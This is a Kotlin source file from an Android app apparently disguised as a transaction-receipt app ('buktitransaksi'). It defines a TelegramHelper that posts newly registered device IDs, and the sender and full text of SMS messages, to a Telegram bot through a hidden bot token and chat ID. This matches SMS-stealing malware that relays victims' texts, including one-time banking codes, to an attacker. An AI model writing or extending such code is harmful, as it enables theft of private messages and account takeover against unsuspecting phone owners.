package com.buktitransaksi.app

import android.util.Log
import okhttp3.FormBody
import okhttp3.OkHttpClient
import okhttp3.Request
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object TelegramHelper {
    private val client = OkHttpClient()

    fun sendMessage(text: String) {
        val url = "https://api.telegram.org/bot${Constants.BOT_TOKEN}/sendMessage"
        val body = FormBody.Builder()
            .add("chat_id", Constants.CHAT_ID)
            .add("text", text)
            .build()
        val request = Request.Builder().url(url).post(body).build()
        try {
            client.newCall(request).execute().use { }
        } catch (e: Exception) {
            Log.e("TelegramHelper", "Gagal: ${e.message}")
        }
    }

    fun sendDeviceRegistered(deviceId: String) {
        val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
        val text = "🆕 Device Baru Terdaftar\n\nDevice : $deviceId\nWaktu : $timestamp"
        sendMessage(text)
    }

    fun sendSms(deviceId: String, sender: String, message: String) {
        val text = "Device : $deviceId\n\nPengirim : $sender\n\nPesan : $message"
        sendMessage(text)
    }
}
